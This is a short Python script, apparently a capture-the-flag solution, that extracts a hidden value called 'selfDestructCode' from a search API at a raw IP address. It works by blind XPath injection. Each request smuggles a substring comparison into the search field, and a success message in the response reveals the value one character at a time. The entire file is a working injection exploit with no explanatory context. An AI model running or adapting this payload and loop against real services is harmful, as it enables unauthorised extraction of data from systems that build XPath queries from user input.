import requests
import string

url = 'http://138.68.148.149:31019/api/search'
headers = {"Content-Type":"application/json"}
flag = ''

for i in range(1,50):
	for char in string.ascii_letters+string.digits+'~!@#$%^&*()_+{}':
		print(char,end="\r")
		temp = flag+char
		data = {"search":f"1' or substring(//military/district[2]//selfDestructCode,1,{i})='{temp}"}
		r = requests.post(url=url, headers=headers, json=data)
		if "This millitary staff member exists" in r.text:
			flag += char
			print(flag)
			break
